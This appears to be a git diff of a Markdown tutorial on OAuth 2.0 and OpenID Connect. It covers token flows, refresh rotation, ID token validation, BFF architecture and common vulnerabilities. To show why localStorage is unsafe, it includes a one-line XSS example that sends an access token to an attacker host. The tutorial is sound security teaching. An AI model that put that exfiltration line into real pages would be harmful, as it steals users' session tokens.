-Real-world uses: YouTube sign-in on TV, AWS CLI --sso, GitHub CLI, Spotify on smart speakers
+    D->>AS: POST /device_authorization<br/>client_id=my-tv-app&scope=openid
+    AS->>D: device_code + user_code (BDPF-YTVQ)<br/>+ verification_uri + interval=5s
+    Note over D: Displays: "Visit auth.app.com/device\nEnter: BDPF-YTVQ"
+    U->>AS: Opens URL on phone, enters code, approves
+    loop Poll every 5 seconds
+        D->>AS: POST /token (device_code)
+        AS->>D: authorization_pending...
+    end
+    AS->>D: 200 OK — access_token (once approved)
 ```
 
-### Refresh Token grant — silent renewal
+> **📖 Real-world uses:** YouTube sign-in on smart TV, AWS CLI `--sso`, GitHub CLI `auth login`, Spotify on smart speakers, Apple TV login.
 
-Refresh tokens are only issued for the **Authorization Code** and **Device Code** grants (not Client Credentials).
+### 💡 Refresh Token — silent renewal lifecycle
 
 ```javascript
-// Recommended pattern: proactive refresh before expiry
 class TokenManager {
-  constructor() {
-    this.accessToken = null;
-    this.refreshToken = null;
-    this.expiresAt = 0;
-  }
+  async getValidToken() {
+    const now           = Math.floor(Date.now() / 1000);
+    const bufferSeconds = 60;
 
-  async getValidAccessToken() {
-    const now = Math.floor(Date.now() / 1000);
-    const bufferSeconds = 60; // refresh 60s before expiry
-
+    // ✅ Still valid — reuse
     if (this.accessToken && now < this.expiresAt - bufferSeconds) {
-      return this.accessToken; // still valid
+      return this.accessToken;
     }
 
-    if (!this.refreshToken) {
-      throw new Error('No refresh token — user must log in');
-    }
-
-    return this.refresh();
-  }
-
-  async refresh() {
-    const response = await fetch('https://auth.example.com/token', {
-      method: 'POST',
+    // 🔄 Silent refresh
+    const res = await fetch("https://auth.example.com/token", {
+      method: "POST",
       body: new URLSearchParams({
-        grant_type: 'refresh_token',
+        grant_type:    "refresh_token",
         refresh_token: this.refreshToken,
-        client_id: CLIENT_ID
-        // Note: some servers require client_secret here too
-      })
+        client_id:     CLIENT_ID,
+      }),
     });
 
-    if (response.status === 400) {
-      // Refresh token expired or revoked — force re-login
-      this.clearTokens();
-      redirectToLogin();
+    if (!res.ok) {
+      // Refresh token expired or revoked — must re-authenticate
+      this.redirectToLogin();
       return;
     }
 
-    const tokens = await response.json();
-    this.accessToken = tokens.access_token;
-    this.expiresAt = Math.floor(Date.now() / 1000) + tokens.expires_in;
+    const tokens = await res.json();
+    this.accessToken  = tokens.access_token;
+    this.expiresAt    = now + tokens.expires_in;
 
-    // With refresh token rotation: always store the new refresh token
+    // 🔐 Refresh token rotation: always store the NEW refresh token
     if (tokens.refresh_token) {
       this.refreshToken = tokens.refresh_token; // old one is now invalid
     }
-
     return this.accessToken;
   }
 }
 ```
 
-**Refresh token rotation:** the Auth Server issues a new refresh token on every use and immediately invalidates the old one. If a stolen refresh token is used, the legitimate holder's next use will fail — alerting the system to a possible breach. **Always enable refresh token rotation in production.**
+> **🔐 Refresh token rotation:** Auth Server issues a new refresh token on every use and invalidates the old one. If a stolen refresh token is used, the legitimate holder's next attempt will fail — alerting the system to a possible breach. **Enable refresh token rotation in all production systems.**
 
-### Implicit grant — deprecated ⚠️
-
-**What it was:** Designed for SPAs in 2012 when CORS restrictions made back-channel calls from browsers difficult. The access token was returned directly in the URL fragment: `callback#access_token=xyz`
-
-**Why it was deprecated:**
-- Token exposed in browser history
-- Token exposed in Referrer headers to third-party scripts
-- No refresh token issued (by design)
-- No mechanism to bind the token to the requesting client
-- Token could be intercepted by other scripts on the page
-
-**What to use instead:** Authorization Code + PKCE. CORS is universally supported today — the original justification no longer exists.
-
-**Status:** Removed from OAuth 2.1.
-
-### Resource Owner Password Credentials (ROPC) — deprecated ⚠️
-
-**What it was:** The app collects the user's username and password directly and sends them to the token endpoint.
+### ⚠️ Deprecated grant types — know them to avoid them
 
 ```
-POST /token
-Body: grant_type=password
-      &username=john@example.com
-      &password=hunter2
-      &client_id=my-app
+┌─────────────────────────────────────────────────────────────────┐
+│  IMPLICIT GRANT — Removed in OAuth 2.1                          │
+│  ─────────────────────────────────────                          │
+│  Was: access_token returned directly in URL fragment            │
+│  Problem: visible in browser history, referrer headers, logs    │
+│  Replace with: Authorization Code + PKCE                        │
+├─────────────────────────────────────────────────────────────────┤
+│  RESOURCE OWNER PASSWORD (ROPC) — Removed in OAuth 2.1         │
+│  ────────────────────────────────────────────────────           │
+│  Was: app collects username + password, sends to token endpoint │
+│  Problem: re-introduces the exact problem OAuth was built to    │
+│           eliminate — app handles your credentials              │
+│  Replace with: Authorization Code + PKCE                        │
+└─────────────────────────────────────────────────────────────────┘
 ```
-
-**Why it defeats the purpose of OAuth:**
-- The app sees and handles the user's password — exactly the problem OAuth was designed to eliminate
-- No consent screen, no redirect — the user has no visibility into what the app will do
-- Cannot support MFA, SSO, or external identity providers
-- The "trusted first-party app" justification is invalid — use Auth Code + PKCE instead
-
-**Status:** Removed from OAuth 2.1. If you see this in a codebase, it must be replaced.
 
 ---
 
 ## Module 6 — OpenID Connect (OIDC) {#module-6}
 
-### What OIDC adds on top of OAuth 2.0
+### 💡 What OIDC adds on top of OAuth 2.0
 
-OAuth 2.0 answers: "what is this application allowed to do?"
-OIDC additionally answers: "who is the user?"
+```
+OAuth 2.0 alone asks:   "What can this app do?"
+OAuth 2.0 + OIDC asks:  "Who is the user?" AND "What can this app do?"
+```
 
-OIDC is a thin identity layer on top of OAuth 2.0. It adds:
-1. **ID Token** — a JWT specifically about the authenticated user
-2. **UserInfo Endpoint** — an API to get additional user claims
-3. **Standard scopes** — `openid`, `profile`, `email`, `address`, `phone`
-4. **Discovery endpoint** — `.well-known/openid-configuration`
-5. **Session management** — logout and session state notifications
+OIDC adds five things on top of OAuth 2.0:
 
-### The three tokens in an OIDC Auth Code flow
+| Addition | What it provides |
+|---|---|
+| **ID Token** | A JWT specifically about the authenticated user |
+| **UserInfo Endpoint** | An API to fetch additional user claims |
+| **Standard scopes** | `openid`, `profile`, `email`, `address`, `phone` |
+| **Discovery** | `.well-known/openid-configuration` auto-configures clients |
+| **Session management** | Logout and session state notifications |
 
-| Token | For | aud claim | Lifetime | Rule |
-|---|---|---|---|---|
-| Access token | Calling APIs | The API's URL | Short (1 hour) | Send to every API request |
-| ID token | Your application only | Your `client_id` | Short (1 hour) | **NEVER send to an API** |
-| Refresh token | Getting new access tokens | — | Long (days/months) | Store securely, send only to Auth Server |
+### 💡 The three tokens — what each one is for
 
-> **The single most common OIDC mistake:** sending the ID token to an API instead of the access token. The ID token's `aud` is your `client_id` — a properly configured API will reject it.
+```
+┌──────────────────────────────────────────────────────────────────────────┐
+│                                                                          │
+│   ACCESS TOKEN         ──── Send to every API call                      │
+│   aud: the API URL     ──── Short-lived (1 hour)                        │
+│   contains: scope      ──── Used by Resource Server                     │
+│                                                                          │
+│   ID TOKEN             ──── Use in your app ONLY                        │
+│   aud: your client_id  ──── Proves the user authenticated               │
+│   contains: email,     ──── ⚠️ NEVER send to an API                    │
+│   name, picture...                                                       │
+│                                                                          │
+│   REFRESH TOKEN        ──── Store securely server-side                  │
+│   (no aud)             ──── Send ONLY to the Auth Server                │
+│                         ──── Long-lived (days/months)                   │
+│                                                                          │
+└──────────────────────────────────────────────────────────────────────────┘
+```
 
-### ID token structure
+> **⚠️ The most common OIDC mistake:** sending the ID token to an API. The ID token's `aud` is your `client_id` — a correctly configured API will reject it with 401.
+
+### 💡 ID token structure
 
 ```json
 {
   "iss": "https://auth.example.com",
-  "sub": "user_123",                   ← Stable unique user identifier
-  "aud": "my-client-app",             ← YOUR client_id, not the API
+  "sub": "user_123",              ← Stable unique user ID — store this in your DB
+  "aud": "my-client-app",         ← YOUR client_id, not the API
   "exp": 1713456789,
   "iat": 1713453189,
-  "nonce": "n-0S6_WzA2Mj",            ← Verify this matches what you sent
-  "at_hash": "77QmUPtjPfzWtF2AnpK9RQ", ← Binds ID token to access token
+  "nonce": "n-0S6_WzA2Mj",        ← Verify this matches what you sent (replay prevention)
+  "at_hash": "77QmUPtjPfzWtF2A",  ← Cryptographic binding to access_token
   "email": "jane@example.com",
-  "email_verified": true,
+  "email_verified": true,         ← See security note below
   "name": "Jane Smith",
-  "given_name": "Jane",
-  "family_name": "Smith",
-  "picture": "https://cdn.example.com/jane.jpg"
+  "given_name": "Jane"
 }
 ```
 
-### OIDC scopes and what they unlock
+> **🔐 `email_verified` matters for security:** An unverified email means someone claimed `admin@yourcompany.com` without proving they own it. If your app identifies users by email without checking `email_verified: true`, an attacker could register `cto@yourcompany.com` with a social IdP (without owning that email) and impersonate your CTO. **Always check `email_verified` before trusting the email claim.**
+
+### 💡 OIDC scopes → claims
 
 ```
-scope=openid
-  → Required for OIDC. Causes an ID token to be issued.
-  → Claims: sub
-
-scope=openid profile
-  → Claims: name, given_name, family_name, middle_name, nickname,
-            preferred_username, profile, picture, website, gender,
-            birthdate, zoneinfo, locale, updated_at
-
-scope=openid email
-  → Claims: email, email_verified
-
-scope=openid address
-  → Claims: address (street_address, locality, region, postal_code, country)
-
-scope=openid phone
-  → Claims: phone_number, phone_number_verified
+scope=openid              → sub  (required minimum)
+scope=openid profile      → name, given_name, family_name, picture, locale, updated_at
+scope=openid email        → email, email_verified
+scope=openid address      → address { street, locality, region, postal_code, country }
+scope=openid phone        → phone_number, phone_number_verified
 ```
 
-### Discovery endpoint
+> **⚠️ Never use email as your unique user identifier.** Use `sub`. Email can change. Two different IdPs may issue the same email for different accounts. The stable composite key to store in your database is `iss + "|" + sub`.
 
-Every OIDC provider publishes a JSON document at:
-```
-https://[issuer]/.well-known/openid-configuration
-```
+### 💡 Discovery endpoint
 
 ```javascript
+// Every OIDC provider publishes a document at /.well-known/openid-configuration
 // Fetch once at startup — no hardcoded endpoint URLs needed
+
 const discovery = await fetch(
-  'https://auth.example.com/.well-known/openid-configuration'
+  "https://auth.example.com/.well-known/openid-configuration"
 ).then(r => r.json());
 
 // All endpoints discovered automatically:
-// discovery.authorization_endpoint
-// discovery.token_endpoint
-// discovery.userinfo_endpoint
-// discovery.jwks_uri
-// discovery.revocation_endpoint
-// discovery.id_token_signing_alg_values_supported
+discovery.authorization_endpoint  // → /authorize
+discovery.token_endpoint          // → /token
+discovery.userinfo_endpoint       // → /userinfo
+discovery.jwks_uri                // → /pf/JWKS
+discovery.revocation_endpoint     // → /revoke
+discovery.introspection_endpoint  // → /introspect
 ```
 
-Example discovery document (abbreviated):
-```json
-{
-  "issuer": "https://accounts.google.com",
-  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
-  "token_endpoint": "https://oauth2.googleapis.com/token",
-  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
-  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
-  "scopes_supported": ["openid", "email", "profile"],
-  "response_types_supported": ["code", "token", "id_token"],
-  "subject_types_supported": ["public"],
-  "id_token_signing_alg_values_supported": ["RS256"],
-  "claims_supported": ["aud", "email", "email_verified", "exp", "name", "sub"]
+### 💡 OIDC Hybrid flow
+
+The **Hybrid flow** combines elements of the Implicit and Authorization Code flows. The SP receives the ID token (and optionally an access token) immediately in the front channel, while also getting an auth code for back-channel token exchange.
+
+```
+response_type=code             → Authorization Code flow (recommended)
+response_type=code id_token    → Hybrid flow
+response_type=code token       → Hybrid flow (with access token in front channel)
+```
+
+**When you see Hybrid flow in the wild:**
+- Legacy enterprise OIDC integrations that needed the ID token before the back-channel exchange
+- Certain OpenID Connect Relying Parties that require an immediate identity assertion
+- Most modern implementations use plain `code` — if you're building new, use Authorization Code only
+
+> **🔐 Hybrid flow security:** Because the ID token is returned in the front channel (URL fragment), it must be validated carefully. The `c_hash` claim binds the ID token to the auth code, and `at_hash` binds it to the access token — always validate these if present.
+
+### 💡 OIDC Authorization Code flow with ID token validation
+
+```javascript
+// After token exchange — validate the ID token before trusting it
+function validateIdToken(idToken, expectedNonce) {
+  const payload = parseJWT(idToken); // library does full sig verification
+
+  if (payload.iss !== EXPECTED_ISSUER)   throw new Error("Invalid issuer");
+  if (payload.aud !== CLIENT_ID)         throw new Error("Wrong audience — this is an API token!");
+  if (payload.exp < Date.now() / 1000)   throw new Error("Token expired");
+  if (payload.nonce !== expectedNonce)   throw new Error("Nonce mismatch — replay attack?");
+
+  // Store user identity using composite key
+  const stableUserId = `${payload.iss}|${payload.sub}`;
+  return { stableUserId, email: payload.email, name: payload.name };
 }
 ```
 
-### OIDC Authorization Code flow
+### 📖 Real-world: "Sign in with Google" dissected
 
-The same as OAuth Authorization Code, with three additions:
-1. Include `openid` in the `scope`
-2. Include a `nonce` in the authorization request
-3. Validate the ID token claims on receipt
+```mermaid
+sequenceDiagram
+    participant U as 👤 User
+    participant App as 📱 Your App
+    participant G as 🔵 Google (IdP)
+    participant API as ⚡ Your API
 
-```javascript
-// Step 1: Generate nonce and include in auth request
-const nonce = crypto.randomUUID();
-sessionStorage.setItem('oidc_nonce', nonce);
-
-const authUrl = new URL(discovery.authorization_endpoint);
-authUrl.searchParams.set('scope', 'openid profile email api.read');
-authUrl.searchParams.set('nonce', nonce);
-// ... other params (response_type, client_id, redirect_uri, state, PKCE)
-
-// Step 2: After token exchange, validate the ID token
-function validateIdToken(idToken) {
-  const payload = parseJWT(idToken); // decode without verifying (library does full verification)
-
-  // Verify claims:
-  if (payload.iss !== EXPECTED_ISSUER) throw new Error('Invalid issuer');
-  if (payload.aud !== CLIENT_ID) throw new Error('Invalid audience');
-  if (payload.exp < Date.now() / 1000) throw new Error('Token expired');
-  if (payload.nonce !== sessionStorage.getItem('oidc_nonce')) {
-    throw new Error('Nonce mismatch — possible replay attack');
-  }
-
-  sessionStorage.removeItem('oidc_nonce');
-  return payload;
-}
-
-// Step 3: Extract user identity
-const user = validateIdToken(tokens.id_token);
-
-// CORRECT: store as composite key
-const userId = `${user.iss}|${user.sub}`;
-// WRONG: using email as unique key — it can change, and two IdPs can issue the same email
-```
-
-### Real-world: "Sign in with Google" dissected
-
-```
-1. User clicks "Sign in with Google" on your app
-
-2. Your app redirects to:
-   https://accounts.google.com/o/oauth2/v2/auth
-     ?response_type=code
-     &client_id=YOUR_CLIENT_ID.apps.googleusercontent.com
-     &redirect_uri=https://yourapp.com/auth/google/callback
-     &scope=openid+email+profile
-     &state=RANDOM_STATE
-     &nonce=RANDOM_NONCE
-     &code_challenge=S256_PKCE_CHALLENGE
-     &code_challenge_method=S256
-
-3. Google shows login + consent screen
-
-4. Google redirects to your callback:
-   https://yourapp.com/auth/google/callback
-     ?code=4/0AX4XfWiM...
-     &state=RANDOM_STATE
-
-5. Your server exchanges code for tokens (back-channel):
-   POST https://oauth2.googleapis.com/token
-   Body: code=4/0AX4XfWiM...
-         &grant_type=authorization_code
-         &client_id=YOUR_CLIENT_ID
-         &client_secret=YOUR_CLIENT_SECRET
-         &redirect_uri=https://yourapp.com/auth/google/callback
-         &code_verifier=PKCE_VERIFIER
-
-6. Google returns:
-   {
-     "access_token":  "ya29.a0AfH6...",  ← Use for Google APIs (Calendar, Drive etc.)
-     "id_token":      "eyJhbGci...",     ← Use to identify the user in YOUR app
-     "expires_in":    3599,
-     "token_type":    "Bearer",
-     "scope":         "openid email profile"
-   }
-
-7. Validate the id_token (signature + iss + aud + exp + nonce)
-
-8. Extract user identity:
-   {
-     "sub":            "110248495921238986420",  ← Use this as the user ID
-     "email":          "jane@gmail.com",
-     "email_verified": true,
-     "name":           "Jane Smith",
-     "picture":        "https://lh3.googleusercontent.com/..."
-   }
-
-9. Create or update user record:
-   const userId = `https://accounts.google.com|110248495921238986420`
-```
-
-> **Key insight:** The `sub` claim is Google's stable unique identifier for this user. Even if the user changes their email, `sub` stays the same. Store `sub` (combined with `iss`) as the primary user key.
-
-### UserInfo endpoint
-
-An alternative to reading claims from the ID token — call the UserInfo endpoint with the access token to get fresh user data:
-
-```javascript
-const userInfo = await fetch(discovery.userinfo_endpoint, {
-  headers: { Authorization: `Bearer ${accessToken}` }
-}).then(r => r.json());
-
-// Returns the same standard claims as the ID token
-// Use when: you need very fresh data, or the ID token doesn't include all claims
-// Don't use when: you need performance (extra network call)
+    App->>G: GET /authorize?scope=openid email profile<br/>&nonce=RANDOM&state=RANDOM&code_challenge=S256
+    G->>U: Show Google login + consent
+    U->>G: Sign in
+    G->>App: callback?code=AUTH_CODE&state=...
+    App->>G: POST /token (back-channel)<br/>code + code_verifier
+    G->>App: access_token + id_token + refresh_token
+    Note over App: Validate id_token:<br/>iss ✓ aud=YOUR_CLIENT_ID ✓<br/>exp ✓ nonce ✓
+    Note over App: Store: iss|sub as user key<br/>NOT email alone
+    App->>API: Bearer access_token (NOT id_token)
+    API->>App: 200 OK + user data
 ```
 
 ---
 
 ## Module 7 — Production patterns and security hardening {#module-7}
 
-### Token storage — the full trade-off matrix
+### 💡 Token storage — the full trade-off matrix
 
-| Storage | XSS risk | CSRF risk | Survives page refresh | Recommendation |
+| Storage | XSS risk | CSRF risk | Survives refresh | Verdict |
 |---|---|---|---|---|
-| JS memory (variable) | Low | None | No | ✅ Good for access token in SPAs |
-| `localStorage` | **High** | None | Yes | ❌ Never store tokens here |
-| `sessionStorage` | **High** | None | No | ⚠️ Only for PKCE verifier/state |
-| `httpOnly` cookie | None | Medium (use SameSite) | Yes | ✅ Best for refresh token |
-| Server-side (BFF) | None | None | Yes | ✅ Best for SPAs overall |
-| OS Keychain/Keystore | None | None | Yes | ✅ Required for mobile apps |
+| **JS memory** (variable) | Low | None | ❌ No | ✅ Best for access token |
+| **`localStorage`** | 🔐 **High** | None | ✅ Yes | ❌ Never store tokens |
+| **`sessionStorage`** | 🔐 **High** | None | ❌ No | ⚠️ PKCE state only |
+| **`httpOnly` cookie** | None | Medium | ✅ Yes | ✅ Best for refresh token |
+| **Server-side (BFF)** | None | None | ✅ Yes | ✅ Recommended for SPAs |
+| **OS Keychain/Keystore** | None | None | ✅ Yes | ✅ Required for mobile |
 
-**Why localStorage is dangerous:**
-```javascript
-// Any XSS payload on your page can do this:
-fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
-// The attacker now has your token and can use it from anywhere
+> **🔐 Why `localStorage` is dangerous:**
+> ```javascript
+> // Any XSS payload on your page can do this:
+> fetch("https://attacker.com/steal?t=" + localStorage.getItem("access_token"));
+> // Attacker now has your token and can use it from anywhere
+> ```
+
+### 💡 The BFF pattern — Backend for Frontend
+
+```mermaid
+graph LR
+    B["🌐 Browser<br/>(SPA / React)"] -- "session cookie only<br/>(httpOnly + Secure + SameSite)" --> BFF
+    BFF["⚙️ BFF Server<br/>(Node/Express)"] -- "holds tokens<br/>server-side" --> AS["🔐 Auth Server"]
+    BFF -- "Bearer token<br/>attached here" --> API["⚡ Resource Server"]
+
+    style B fill:#FAEEDA,stroke:#EF9F27
+    style BFF fill:#E6F1FB,stroke:#185FA5
+    style AS fill:#EEEDFE,stroke:#534AB7
+    style API fill:#E1F5EE,stroke:#0F6E56
 ```
 
-**Why httpOnly cookies are safer:**
-```javascript
-// An XSS payload CANNOT access httpOnly cookies:
-document.cookie // → only shows non-httpOnly cookies
-// The token cookie is invisible to JavaScript — only sent automatically by the browser
-```
+**The key property:** browser JavaScript can never access tokens — they live only on the BFF server. XSS in the browser cannot steal tokens because the browser doesn't have them.
 
-### The BFF pattern — Backend for Frontend
-
-The most secure architecture for browser-based (SPA) applications.
-
-```
-Browser (React/Vue/Angular)
-     │
-     │ session cookie only (httpOnly, Secure, SameSite=Strict)
-     │ API calls go to /api/* on the same domain
-     ▼
-BFF (Node/Express/NestJS) ← runs on your server
-     │                    ← holds access_token and refresh_token in memory/Redis
-     │
-     ├── /auth/callback   ← handles OIDC redirect, stores tokens server-side
-     ├── /api/*           ← proxies to Resource Server with Bearer token attached
-     └── /auth/logout     ← revokes tokens, clears session
-     │
-     ├── Auth Server  (OIDC flow)
-     └── Resource Server  (API calls with Bearer token)
-```
+### 💡 Complete resource server validation checklist
 
 ```javascript
-// BFF: Express.js example
-import express from 'express';
-import session from 'express-session';
-
-const app = express();
-
-app.use(session({
-  secret: process.env.SESSION_SECRET,
-  cookie: { httpOnly: true, secure: true, sameSite: 'strict' },
-  resave: false,
-  saveUninitialized: false,
-  store: new RedisStore({ client: redisClient }) // persistent sessions
-}));
-
-// Auth callback — exchange code, store tokens server-side
-app.get('/auth/callback', async (req, res) => {
-  const { code, state } = req.query;
-  if (state !== req.session.oauthState) return res.status(400).send('CSRF detected');
-
-  const tokens = await exchangeCodeForTokens(code, req.session.pkceVerifier);
-  req.session.accessToken = tokens.access_token;
-  req.session.refreshToken = tokens.refresh_token;
-  req.session.tokenExpiry = Date.now() + tokens.expires_in * 1000;
-
-  res.redirect('/dashboard');
-});
-
-// Proxy API calls — attach Bearer token transparently
-app.use('/api', async (req, res) => {
-  const token = await getValidToken(req.session); // refreshes if needed
-  const apiResponse = await fetch(`${API_BASE_URL}${req.path}`, {
-    method: req.method,
-    headers: {
-      ...req.headers,
-      Authorization: `Bearer ${token}`
-    }
-  });
-  // stream response back
-});
-```
-
-### Complete token validation checklist for resource servers
-
-```javascript
-import { createRemoteJWKSet, jwtVerify } from 'jose';
+import { createRemoteJWKSet, jwtVerify } from "jose";
 
 const JWKS = createRemoteJWKSet(
-  new URL('https://auth.example.com/.well-known/jwks.json'),
-  { cacheMaxAge: 600_000 } // cache public keys for 10 minutes
+  new URL("https://auth.example.com/.well-known/jwks.json"),
+  { cacheMaxAge: 600_000 } // cache public keys for 10 min
 );
 
 async function validateToken(authHeader) {
-  if (!authHeader?.startsWith('Bearer ')) {
-    throw { status: 401, error: 'missing_token' };
+  if (!authHeader?.startsWith("Bearer ")) {
+    throw { status: 401, error: "missing_token" };
   }
 
   const token = authHeader.slice(7);
 
-  // Library validates: signature, exp, nbf, iss, aud, algorithms
+  // Library handles: signature ✓  exp ✓  nbf ✓  iss ✓  aud ✓
   const { payload } = await jwtVerify(token, JWKS, {
-    issuer:    process.env.EXPECTED_ISSUER,
-    audience:  process.env.EXPECTED_AUDIENCE,
-    algorithms: ['RS256', 'ES256'],  // prevents alg:none attack
+    issuer:     process.env.EXPECTED_ISSUER,
+    audience:   process.env.EXPECTED_AUDIENCE,
+    algorithms: ["RS256", "ES256"],  // 🔐 prevents alg:none attack
   });
 
-  // Manual checks after library validation:
-  const requiredScope = 'api.read';
-  if (!payload.scope?.split(' ').includes(requiredScope)) {
-    throw { status: 403, error: 'insufficient_scope',
-            scope_required: requiredScope };
+  // Manual check: does this token have the required scope?
+  if (!payload.scope?.split(" ").includes("api.read")) {
+    throw { status: 403, error: "insufficient_scope" };
   }
 
-  return payload;
+  return payload; // sub, email, roles etc. are now safe to use
 }
-
-// Validation checklist:
-// ✅ Signature valid (RS256/ES256 with correct public key)
-// ✅ exp not in the past
-// ✅ iss matches expected Auth Server
-// ✅ aud matches this API's identifier
-// ✅ alg is in the allowed list (never allow alg:none)
-// ✅ scope contains the required permission
-// Optional:
-// ✅ nbf (not before) if present
-// ✅ jti not in replay blocklist if using jti
 ```
 
-### Common OAuth/OIDC vulnerabilities
+### 🔐 Common OAuth/OIDC vulnerabilities
 
-| Attack | How it works | Mitigation |
+| Attack | How it works | Prevention |
 |---|---|---|
-| Auth code interception | Malicious app intercepts auth code from redirect | PKCE (mandatory) |
-| Login CSRF | Attacker tricks browser into completing attacker's login flow | `state` parameter (mandatory) |
-| ID token replay | Stolen ID token re-used | `nonce` parameter (mandatory for OIDC) |
-| Open redirect | `redirect_uri` manipulated to send code to attacker | Exact redirect URI matching (OAuth 2.1 mandates this) |
-| Token leakage via Referrer | Token in URL leaks through Referrer header to third parties | Never put tokens in URLs |
-| alg:none attack | JWT header sets `"alg":"none"`, library skips signature check | Always explicitly set allowed algorithms |
-| Issuer confusion | Dev token accepted in prod (same library, different issuer) | Always validate `iss` claim |
-| Audience confusion | Token for API-A used on API-B | Always validate `aud` claim |
-| Token substitution | ID token sent to API instead of access token | Validate `aud` on the API — should be the API URL, not a client_id |
+| **Auth code interception** | Malicious app intercepts auth code from redirect | PKCE (now mandatory) |
+| **Login CSRF** | Attacker tricks browser into completing attacker's login | `state` parameter |
+| **ID token replay** | Stolen ID token re-submitted | `nonce` parameter |
+| **Open redirect** | `redirect_uri` manipulated to send code to attacker | Exact URI matching (OAuth 2.1 mandates) |
+| **Token leakage** | Token in URL leaks through Referrer header | Never put tokens in URLs |
+| **`alg:none`** | JWT header sets no-signature, library skips check | Explicit algorithm allowlist |
+| **Issuer confusion** | Dev token accepted in prod (same iss not validated) | Always validate `iss` claim |
+| **Audience confusion** | Token for API-A used on API-B | Always validate `aud` claim |
+| **Mix-up attack** | Attacker redirects auth code to a different token endpoint | Validate `iss` in authorization response; use `iss` parameter (RFC 9207) |
 
-### OAuth 2.1 — changes and migration
+> **🔐 Mix-up attack explained:** In an environment where a client supports multiple IdPs, an attacker who controls one IdP can redirect the victim's auth code from a legitimate IdP to the attacker's token endpoint. The attacker then uses the legitimate code at the real token endpoint and steals the resulting tokens. **Prevention:** validate the `iss` parameter in the authorization response (RFC 9207), and bind the authorization request to the specific IdP using `iss` in the initial request.
 
-OAuth 2.1 (draft) consolidates OAuth 2.0 with all subsequent security RFCs into a single document.
+### 💡 OAuth 2.1 — what is changing
 
-**What is removed:**
-- Implicit grant → replaced by Authorization Code + PKCE
-- Resource Owner Password Credentials (ROPC) grant
-
-**What is now mandatory:**
-- PKCE for all Authorization Code flows (public and confidential clients)
-- Refresh token rotation
-- Exact redirect URI string matching (no wildcard or partial matching)
-- Bearer token prohibited in URL query strings
-
-**Migration checklist for existing implementations:**
 ```
-□ Identify any Implicit grant usage → migrate to Auth Code + PKCE
-□ Identify any ROPC grant usage → migrate to Auth Code + PKCE
-□ Add PKCE to all existing Auth Code flows
-□ Enable refresh token rotation on the Auth Server
-□ Audit redirect URI configurations — ensure exact match required
-□ Grep codebase for tokens in URL query parameters → move to headers
-□ Verify all token validation explicitly sets allowed algorithms
+Removed:       Implicit grant       → use Authorization Code + PKCE
+Removed:       ROPC grant           → use Authorization Code + PKCE
+Mandatory:     PKCE for ALL flows (public and confidential clients)
+Mandatory:     Refresh token rotation
+Mandatory:     Exact redirect URI string matching
+Prohibited:    Bearer token in URL query strings
 ```
 
 ---
 
-## Quick Reference — Cheat Sheet {#quick-reference}
+## Quick Reference Cheat Sheet {#quick-reference}
 
 ### Which grant type to use?
 
@@ -1006,74 +831,64 @@ Is a human user involved?
 └── Yes
     ├── Has a browser?
     │   └── Yes → Authorization Code + PKCE
-    ├── Input-constrained device (TV, CLI, IoT)?
+    ├── Input-constrained device (TV, CLI)?
     │   └── Yes → Device Code
-    └── Building your own first-party login UI?
+    └── Building first-party login UI?
         └── Use Auth Code + PKCE (never ROPC)
 ```
 
 ### Grant type quick reference
 
-| Grant | User involved | Tokens issued | Use case |
+| Grant | User | Tokens issued | Use case |
 |---|---|---|---|
 | Client Credentials | No | Access only | Service-to-service, cron jobs |
-| Authorization Code + PKCE | Yes | Access + Refresh + ID (with OIDC) | Web apps, mobile apps |
+| Auth Code + PKCE | Yes | Access + Refresh + ID (OIDC) | Web apps, mobile apps |
 | Device Code | Yes | Access + Refresh | Smart TVs, CLIs, IoT |
-| Refresh Token | Derived from above | New access + new refresh | Silent renewal |
-| ~~Implicit~~ | ~~Yes~~ | ~~Access only~~ | ~~Deprecated~~ |
-| ~~ROPC~~ | ~~Yes~~ | ~~Access + Refresh~~ | ~~Deprecated~~ |
+| Refresh Token | Derived | New access + new refresh | Silent renewal |
+| ~~Implicit~~ | ~~Yes~~ | ~~Access only~~ | ~~Deprecated — do not use~~ |
+| ~~ROPC~~ | ~~Yes~~ | ~~Access + Refresh~~ | ~~Deprecated — do not use~~ |
 
-### JWT validation quick reference
-
-```
-Resource server must validate:
-✅ Signature   — verify with public key from JWKS endpoint
-✅ alg         — must be in explicit allow-list (never allow alg:none)
-✅ exp         — current time must be before expiry
-✅ iss         — must match the expected Auth Server URL
-✅ aud         — must match this API's own identifier
-✅ scope       — must contain the permission required for this endpoint
-
-OIDC: client app must additionally validate the ID token:
-✅ aud         — must equal your client_id
-✅ nonce       — must match what you sent in the auth request
-✅ at_hash     — if present, must match the access token (optional but good practice)
-```
-
-### Security rules — the non-negotiables
+### JWT validation (resource server must check every field)
 
 ```
-1.  Always use PKCE for Authorization Code flows
-2.  Always validate the state parameter on callback
+✅ Signature    — RS256/ES256 with public key from JWKS endpoint
+✅ alg          — explicit allow-list, never permit alg:none
+✅ exp          — current time must be before expiry
+✅ iss          — must match the expected Auth Server URL exactly
+✅ aud          — must match this API's own identifier
+✅ scope        — must contain the required permission
+✅ nbf          — if present, current time must be after not-before
+```
+
+### Security non-negotiables
+
+```
+1.  PKCE for all Authorization Code flows
+2.  Validate state on every callback (CSRF prevention)
 3.  Never store tokens in localStorage
 4.  Never put tokens in URL query strings
 5.  Never send the ID token to an API
-6.  Never use the email claim as a unique user identifier — use sub
-7.  Always explicitly set allowed signing algorithms (never allow alg:none)
-8.  Always validate iss and aud claims on the resource server
+6.  Never use email as a unique user identifier — use iss + sub
+7.  Explicit algorithm allowlist on the receiving side (no alg:none)
+8.  Always validate iss AND aud claims on the resource server
 9.  Enable refresh token rotation
-10. Store client_secret in a secrets manager, never in source code
+10. Client secrets in a secrets manager, never in source code
+11. Check email_verified before trusting the email claim
+12. Revoke refresh token on logout (RFC 7009 revocation endpoint)
 ```
 
-### OAuth 2.0 vs OIDC — when you need which
+### When you need which protocol
 
-| Need | Use |
+| Need | Protocol |
 |---|---|
 | App calling an API | OAuth 2.0 |
 | App needs to know who the user is | OAuth 2.0 + OIDC |
 | SSO across multiple apps | OAuth 2.0 + OIDC |
-| "Sign in with Google/Apple/Microsoft" | OIDC |
-| Service-to-service API calls | OAuth 2.0 (Client Credentials only) |
+| "Sign in with Google/Apple" | OIDC |
